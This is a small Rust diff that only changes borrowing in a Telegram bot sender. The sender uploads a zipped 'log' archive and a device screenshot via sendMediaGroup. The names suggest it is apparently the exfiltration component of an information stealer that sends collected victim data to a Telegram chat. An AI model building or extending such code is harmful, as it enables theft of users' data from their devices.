@@ -202,7 +202,7 @@ impl TelegramBotSender {
     fn send_as_file(
         &self,
         log_name: &str,
-        archive: Vec<u8>,
+        archive: &[u8],
         screenshot: Option<Vec<u8>>,
         caption: String,
         thumbnail: Option<String>,
@@ -232,7 +232,7 @@ impl TelegramBotSender {
         let media_json = media_group.to_string();
 
         write_text_field!(builder, "media" => &media_json);
-        write_file_field!(builder, "logfile", log_name => "application/zip", &archive);
+        write_file_field!(builder, "logfile", log_name => "application/zip", archive);
 
         self.send_request(s!("sendMediaGroup"), builder)?;
 
@@ -325,7 +325,7 @@ impl LogSender for TelegramBotSender {
         match content {
             LogContent::ZipArchive(archive) => self.send_as_file(
                 &name,
-                archive,
+                &archive,
                 collector.get_device().get_screenshot(),
                 caption,
                 thumbnail,
